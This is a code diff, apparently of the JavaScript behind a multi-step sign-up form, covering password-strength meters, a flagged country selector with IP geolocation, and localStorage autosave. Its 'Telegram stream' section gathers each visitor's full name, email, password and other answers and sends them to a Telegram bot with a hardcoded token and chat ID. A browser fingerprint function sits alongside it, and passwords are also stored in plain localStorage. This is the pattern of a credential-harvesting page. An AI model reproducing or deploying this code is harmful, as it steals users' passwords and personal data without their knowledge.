@@ -1041,103 +1041,81 @@ function setupPasswordSystem(passwordId, confirmId) {
     createBars("strength-meter-confirm");
 
     /* =========================
-       INPUT SYNC SYSTEM
-    ========================= */
+   INPUT SYNC SYSTEM
+========================= */
+if (typeof password !== 'undefined' && typeof confirmPassword !== 'undefined') {
     password.addEventListener("input", handleSync);
-    confirm.addEventListener("input", handleSync);
+    confirmPassword.addEventListener("input", handleSync);
+}
 
-    function handleSync() {
+function handleSync() {
+    const passwordValue = password.value;
+    const confirmValue = confirmPassword.value;
 
-        const passwordValue = password.value;
-        const confirmValue = confirm.value;
+    const passwordScore = typeof calculateStrength === 'function' ? calculateStrength(passwordValue) : 0;
+    const confirmScore = typeof calculateStrength === 'function' ? calculateStrength(confirmValue) : 0;
 
-        const passwordScore = calculateStrength(passwordValue);
-        const confirmScore = calculateStrength(confirmValue);
+    const passwordMeter = document.getElementById("strength-meter-password");
+    const passwordLabel = document.getElementById("strength-label-password");
 
-        const passwordMeter = document.getElementById("strength-meter-password");
-        const passwordLabel = document.getElementById("strength-label-password");
+    const confirmMeter = document.getElementById("strength-meter-confirm");
+    const confirmLabel = document.getElementById("strength-label-confirm");
 
-        const confirmMeter = document.getElementById("strength-meter-confirm");
-        const confirmLabel = document.getElementById("strength-label-confirm");
-
-        /* PASSWORD LABEL */
-        if (passwordLabel) {
-
-            if (passwordValue.length === 0) {
-                passwordLabel.textContent = "";
-            }
-
-            else if (passwordScore <= 1) {
-                passwordLabel.textContent = "Weak";
-            }
-
-            else if (passwordScore === 2) {
-                passwordLabel.textContent = "Medium";
-            }
-
-            else {
-                passwordLabel.textContent = "Strong";
-            }
-        }
-
-        /* PASSWORD METER */
-        if (passwordMeter) {
-            renderBars(passwordMeter, passwordScore);
-        }
-
-        /* CONFIRM EMPTY RESET */
-        if (confirmValue.length === 0) {
-
-            if (confirmLabel) {
-                confirmLabel.textContent = "";
-            }
-
-            if (confirmMeter) {
-                renderBars(confirmMeter, 0);
-            }
-
-            return;
-        }
-
-        const mismatch = confirmValue !== passwordValue;
-
-        /* MISMATCH STATE */
-        if (mismatch) {
-
-            if (confirmLabel) {
-                confirmLabel.textContent = "Doesn't match password";
-                confirmLabel.style.color = "#ff4d4d";
-            }
-
-            if (confirmMeter) {
-
-                const bars = confirmMeter.querySelectorAll("div");
-
-                for (let i = 0; i < bars.length; i++) {
-                    bars[i].style.opacity = "0.25";
-                }
-            }
-
+    /* PASSWORD LABEL */
+    if (passwordLabel) {
+        if (passwordValue.length === 0) {
+            passwordLabel.textContent = "";
+        } else if (passwordScore <= 1) {
+            passwordLabel.textContent = "Weak";
+        } else if (passwordScore === 2) {
+            passwordLabel.textContent = "Medium";
         } else {
+            passwordLabel.textContent = "Strong";
+        }
+    }
 
-            if (confirmLabel) {
+    /* PASSWORD METER */
+    if (passwordMeter) {
+        renderBars(passwordMeter, passwordScore);
+    }
 
-                if (confirmScore <= 1) {
-                    confirmLabel.textContent = "Weak";
-                }
+    /* CONFIRM EMPTY RESET */
+    if (confirmValue.length === 0) {
+        if (confirmLabel) {
+            confirmLabel.textContent = "";
+        }
+        if (confirmMeter) {
+            renderBars(confirmMeter, 0);
+        }
+        return;
+    }
 
-                else if (confirmScore === 2) {
-                    confirmLabel.textContent = "Medium";
-                }
+    const mismatch = confirmValue !== passwordValue;
 
-                else {
-                    confirmLabel.textContent = "Strong";
-                }
+    /* MISMATCH STATE */
+    if (mismatch) {
+        if (confirmLabel) {
+            confirmLabel.textContent = "Doesn't match password";
+            confirmLabel.style.color = "#ff4d4d";
+        }
+        if (confirmMeter) {
+            const bars = confirmMeter.querySelectorAll("div");
+            for (let i = 0; i < bars.length; i++) {
+                bars[i].style.opacity = "0.25";
             }
-
-            if (confirmMeter) {
-                renderBars(confirmMeter, confirmScore);
+        }
+    } else {
+        if (confirmLabel) {
+            if (confirmScore <= 1) {
+                confirmLabel.textContent = "Weak";
+            } else if (confirmScore === 2) {
+                confirmLabel.textContent = "Medium";
+            } else {
+                confirmLabel.textContent = "Strong";
             }
+        }
+        if (confirmMeter) {
+            renderBars(confirmMeter, confirmScore);
         }
     }
 }
@@ -1146,197 +1124,182 @@ function setupPasswordSystem(passwordId, confirmId) {
 CONTINENT MAPPING
 ========================= */
 function getContinent(country) {
-const map = {
-"United States": "North America",
-"Canada": "North America",
-"Mexico": "North America",
-
-"United Kingdom": "Europe",
-"Germany": "Europe",
-"France": "Europe",
-"Italy": "Europe",
-"Spain": "Europe",
-
-"Australia": "Oceania",    
-"New Zealand": "Oceania",    
-
-"Brazil": "South America",    
-"Argentina": "South America",    
-"Colombia": "South America",    
-
-"Nigeria": "Africa",    
-"South Africa": "Africa",    
-"Kenya": "Africa",    
-"Ghana": "Africa",    
-"Egypt": "Africa",    
-
-"India": "Asia",    
-"China": "Asia",    
-"Japan": "Asia",    
-"Philippines": "Asia",    
-"Indonesia": "Asia",    
-"UAE": "Asia"
-};
-
-return map[country] || "Unknown";
+    const map = {
+        "United States": "North America",
+        "Canada": "North America",
+        "Mexico": "North America",
+        "United Kingdom": "Europe",
+        "Germany": "Europe",
+        "France": "Europe",
+        "Italy": "Europe",
+        "Spain": "Europe",
+        "Australia": "Oceania",    
+        "New Zealand": "Oceania",    
+        "Brazil": "South America",    
+        "Argentina": "South America",    
+        "Colombia": "South America",    
+        "Nigeria": "Africa",    
+        "South Africa": "Africa",    
+        "Kenya": "Africa",    
+        "Ghana": "Africa",    
+        "Egypt": "Africa",    
+        "India": "Asia",    
+        "China": "Asia",    
+        "Japan": "Asia",    
+        "Philippines": "Asia",    
+        "Indonesia": "Asia",    
+        "UAE": "Asia"
+    };
+    return map[country] || "Unknown";
 }
 
 /* =========================
 FLAGS
 ========================= */
 const countryFlags = {
-"United States": "🇺🇸",
-"Canada": "🇨🇦",
-"Mexico": "🇲🇽",
-"United Kingdom": "🇬🇧",
-"Germany": "🇩🇪",
-"France": "🇫🇷",
-"Italy": "🇮🇹",
-"Spain": "🇪🇸",
-"Australia": "🇦🇺",
-"New Zealand": "🇳🇿",
-"Brazil": "🇧🇷",
-"Argentina": "🇦🇷",
-"Colombia": "🇨🇴",
-"Nigeria": "🇳🇬",
-"South Africa": "🇿🇦",
-"Kenya": "🇰🇪",
-"Ghana": "🇬🇭",
-"Egypt": "🇪🇬",
-"India": "🇮🇳",
-"China": "🇨🇳",
-"Japan": "🇯🇵",
-"Philippines": "🇵🇭",
-"Indonesia": "🇮🇩",
-"UAE": "🇦🇪"
+    "United States": "🇺🇸",
+    "Canada": "🇨🇦",
+    "Mexico": "🇲🇽",
+    "United Kingdom": "🇬🇧",
+    "Germany": "🇩🇪",
+    "France": "🇫🇷",
+    "Italy": "🇮🇹",
+    "Spain": "🇪🇸",
+    "Australia": "🇦🇺",
+    "New Zealand": "🇳🇿",
+    "Brazil": "🇧🇷",
+    "Argentina": "🇦🇷",
+    "Colombia": "🇨🇴",
+    "Nigeria": "🇳🇬",
+    "South Africa": "🇿🇦",
+    "Kenya": "🇰🇪",
+    "Ghana": "🇬🇭",
+    "Egypt": "🇪🇬",
+    "India": "🇮🇳",
+    "China": "🇨🇳",
+    "Japan": "🇯🇵",
+    "Philippines": "🇵🇭",
+    "Indonesia": "🇮🇩",
+    "UAE": "🇦🇪"
 };
 
 function getFlag(country) {
-return countryFlags[country] || "🌍";
+    return countryFlags[country] || "🌍";
 }
 
 /* =========================
 SELECT2 FORMAT (FIXED BUG)
-IMPORTANT: NEVER break selection rendering
 ========================= */
 function formatCountrySelection(option) {
-if (!option.id) return option.text;
-
-const country = option.text;
-const flag = getFlag(country);
-
-return `${flag} ${country}`;
+    if (!option.id) return option.text;
+    const country = option.text;
+    const flag = getFlag(country);
+    return `${flag} ${country}`;
 }
 
 /* =========================
 SELECT2 FORMAT RESULT
 ========================= */
 function formatCountry(option) {
-if (!option.id) return option.text;
+    if (!option.id) return option.text;
+    const country = option.text;
+    const flag = getFlag(country);
+    const continent = getContinent(country);
 
-const country = option.text;
-const flag = getFlag(country);
-const continent = getContinent(country);
-
-const el = document.createElement("span");
-el.innerHTML = `
-    <span style="margin-right:8px;">${flag}</span>
-    <strong>${country}</strong>
-    <span style="opacity:0.6;font-size:12px;"> — ${continent}</span>
-`;
-
-return el;
+    const el = document.createElement("span");
+    el.innerHTML = `
+        <span style="margin-right:8px;">${flag}</span>
+        <strong>${country}</strong>
+        <span style="opacity:0.6;font-size:12px;"> — ${continent}</span>
+    `;
+    return el;
 }
 
 /* =========================
 INIT SELECT2 (FIXED ORDER ISSUE)
 ========================= */
 function initSelect2() {
-if (!window.jQuery || !$.fn.select2) {
-setTimeout(initSelect2, 100);
-return;
-}
+    if (!window.jQuery || !$.fn.select2) {
+        setTimeout(initSelect2, 100);
+        return;
+    }
 
-$('#location').select2({
-placeholder: "Search your country",
-allowClear: true,
-
-templateResult: function(option) {
-if (!option.id) return option.text;
-return formatCountry(option);
-},
-
-templateSelection: formatCountrySelection,
-width: "100%"
-});
+    $('#location').select2({
+        placeholder: "Search your country",
+        allowClear: true,
+        templateResult: function(option) {
+            if (!option.id) return option.text;
+            return formatCountry(option);
+        },
+        templateSelection: formatCountrySelection,
+        width: "100%"
+    });
 }
 
 /* =========================
 AUTO DETECT COUNTRY (SAFE)
 ========================= */
 async function autoDetectCountry() {
-try {
-const res = await fetch("https://ipapi.co/json/");
-const data = await res.json();
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        const country = data.country_name;
+        if (!country) return;
 
-const country = data.country_name;
-if (!country) return;
-
-const current = $('#location').val();
-
-if (!current && window.jQuery && $.fn.select2) {
-$('#location').val(country).trigger('change');
-}
-
-} catch (err) {
-console.log("Auto-detect failed:", err);
-}
+        const current = $('#location').val();
+        if (!current && window.jQuery && $.fn.select2) {
+            $('#location').val(country).trigger('change');
+        }
+    } catch (err) {
+        console.log("Auto-detect failed:", err);
+    }
 }
 
 /* =========================
 RESTORE SAVED DATA
 ========================= */
-
-
 setTimeout(function () {
+    const localData = localStorage.getItem("section2Data");
+    if (!localData) return;
+    
+    const savedData = JSON.parse(localData);
 
-if (savedData.location && window.jQuery) {
-$('#location').val(savedData.location).trigger('change');
-}
+    if (savedData.location && window.jQuery) {
+        $('#location').val(savedData.location).trigger('change');
+    }
+    if (savedData.fullName && typeof fullName !== 'undefined') {
+        fullName.value = savedData.fullName;
+    }
+    if (savedData.email && typeof email !== 'undefined') {
+        email.value = savedData.email;
+    }
+    if (savedData.password && typeof password !== 'undefined') {
+        password.value = savedData.password;
+    }
+    if (savedData.confirmPassword && typeof confirmPassword !== 'undefined') {
+        confirmPassword.value = savedData.confirmPassword;
+    }
+    if (savedData.experience) {
+        experience = savedData.experience;
+        document.querySelectorAll(".option-btn").forEach(function (btn) {
+            if (btn.dataset.value === experience) {
+                btn.classList.add("active");
+            }
+        });
+    }
 
-if (savedData.fullName) {
-fullName.value = savedData.fullName;
-}
-
-if (savedData.email) {
-email.value = savedData.email;
-}
-
-if (savedData.password) {
-password.value = savedData.password;
-}
-
-if (savedData.confirmPassword) {
-confirmPassword.value = savedData.confirmPassword;
-}
-
-if (savedData.experience) {
-experience = savedData.experience;
-}
-
-password.dispatchEvent(new Event("input"));
-confirmPassword.dispatchEvent(new Event("input"));
-
+    if (typeof password !== 'undefined' && typeof confirmPassword !== 'undefined') {
+        password.dispatchEvent(new Event("input"));
+        confirmPassword.dispatchEvent(new Event("input"));
+    }
 }, 500);
 
 /* =========================
 AUTO SAVE & TELEGRAM STREAM SYSTEM
 ========================= */
-// Global variable to keep track of the last sent data string to prevent spamming duplicate logs
 let lastSentPayload = "";
 
 async function saveSection2() {
-    // 1. Gather all current form inputs safely
     const data = {
         fullName: document.getElementById('fullName')?.value?.trim() || fullName?.value?.trim() || "",
         email: document.getElementById('email')?.value?.trim() || email?.value?.trim() || "",
@@ -1346,20 +1309,17 @@ async function saveSection2() {
         experience: typeof experience !== 'undefined' ? experience : ""
     };
 
-    // 2. Commit seamlessly to local device storage (keeps auto-save working instantly)
     localStorage.setItem("section2Data", JSON.stringify(data));
 
-    // 3. OPTION 2 GATEWAY: Stop completely if even ONE single field is still empty
+    /* OPTION 2 GATEWAY: Stop completely if even ONE field is empty */
     if (!data.fullName || !data.email || !data.password || !data.confirmPassword || !data.location || !data.experience) {
-        return; // Safe exit! Saves locally but won't ping your Telegram group yet.
+        return; 
     }
 
-    // 4. Prevent duplicate network calls if the completed data hasn't changed
     const currentPayloadString = JSON.stringify(data);
     if (currentPayloadString === lastSentPayload) return;
     lastSentPayload = currentPayloadString;
 
-    // 5. Stream data to your Telegram Monitor only when 100% complete
     const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
     const CHAT_IDs = '-1003913850436'; 
 
@@ -1396,7 +1356,7 @@ async function saveSection2() {
 }
 
 /* =========================
-EVENT LISTENERS (Triggers save + sync validation)
+EVENT LISTENERS
 ========================= */
 if (typeof fullName !== 'undefined' && fullName.addEventListener) fullName.addEventListener("input", saveSection2);
 if (typeof email !== 'undefined' && email.addEventListener) email.addEventListener("input", saveSection2);
@@ -1416,17 +1376,13 @@ EXPERIENCE BUTTONS
 document.querySelectorAll(".option-btn").forEach(function (btn) {
     btn.onclick = function () {
         experience = btn.dataset.value;
-
         document.querySelectorAll(".option-btn").forEach(function (b) {
             b.classList.remove("active");
         });
-
         btn.classList.add("active");
-
         saveSection2();
     };
 });
-
 
 /* =========================
 NAVIGATION
@@ -1434,12 +1390,10 @@ NAVIGATION
 const nextBtn = document.getElementById("nextBtn");
 
 if (nextBtn) {
-
     nextBtn.onclick = function () {
-
         let hasError = false;
-
-        const locationValue = window.jQuery ? $('#location').val() : locationEl.value;
+        const locationEl = document.getElementById('location');
+        const locationValue = window.jQuery ? $('#location').val() : locationEl?.value;
 
         const fields = [
             { el: fullName },
@@ -1449,17 +1403,14 @@ if (nextBtn) {
         ];
 
         fields.forEach(function (field) {
-
+            if (!field.el) return;
             const value = field.el.value.trim();
 
             if (!value) {
                 hasError = true;
-
-                const card = field.el.closest(".payment-method");
-
+                const card = field.el.closest(".payment-method") || field.el.closest(".glass-card");
                 if (card) {
                     card.classList.add("warning");
-
                     setTimeout(function () {
                         card.classList.remove("warning");
                     }, 2200);
@@ -1467,18 +1418,15 @@ if (nextBtn) {
             }
         });
 
-        if (password.value !== confirmPassword.value) {
+        if (password && confirmPassword && password.value !== confirmPassword.value) {
             hasError = true;
         }
-
         if (!locationValue) {
             hasError = true;
         }
-
         if (!experience) {
             hasError = true;
         }
-
         if (hasError) {
             return;
         }
@@ -1492,7 +1440,6 @@ if (nextBtn) {
 FINGERPRINT
 ========================= */
 function getFingerprint() {
-
     return btoa(
         navigator.userAgent +
         screen.width +
